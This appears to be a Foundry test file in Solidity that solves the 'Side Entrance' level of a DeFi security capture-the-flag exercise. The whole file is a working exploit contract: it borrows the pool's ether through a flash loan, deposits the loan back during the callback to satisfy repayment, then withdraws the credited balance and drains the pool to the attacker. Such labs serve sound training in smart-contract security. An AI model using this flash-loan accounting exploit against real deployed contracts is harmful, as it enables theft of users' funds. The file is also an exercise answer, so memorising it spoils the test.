// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        AttackerContract attackerContract = new AttackerContract(address(sideEntranceLenderPool));

        attackerContract.attack(ETHER_IN_POOL);

        vm.prank(attacker);
        
        attackerContract.withdraw();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}


contract AttackerContract is IFlashLoanEtherReceiver {

    address immutable victim;

    constructor (address _victim) {
        victim = _victim;
    }

    /**
        @param amount flashloan to request
     */
    function attack (uint256 amount) external {
        (bool success,) = victim.call(abi.encodeWithSignature("flashLoan(uint256)", amount));
        require(success);
    }

    /**
        call back function for flashloan receiver this function is called when ever a user
     */
    function execute() external payable {
        (bool success,) = payable(msg.sender).call{value:msg.value}(abi.encodeWithSignature("deposit()"));
        require(success);
    }

    /**

     */

    function withdraw() external {
        (bool _sucess,) = payable(victim).call{value: 0}(abi.encodeWithSignature("withdraw()"));
        require(_sucess);
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success);
    }


    fallback () payable external {}

}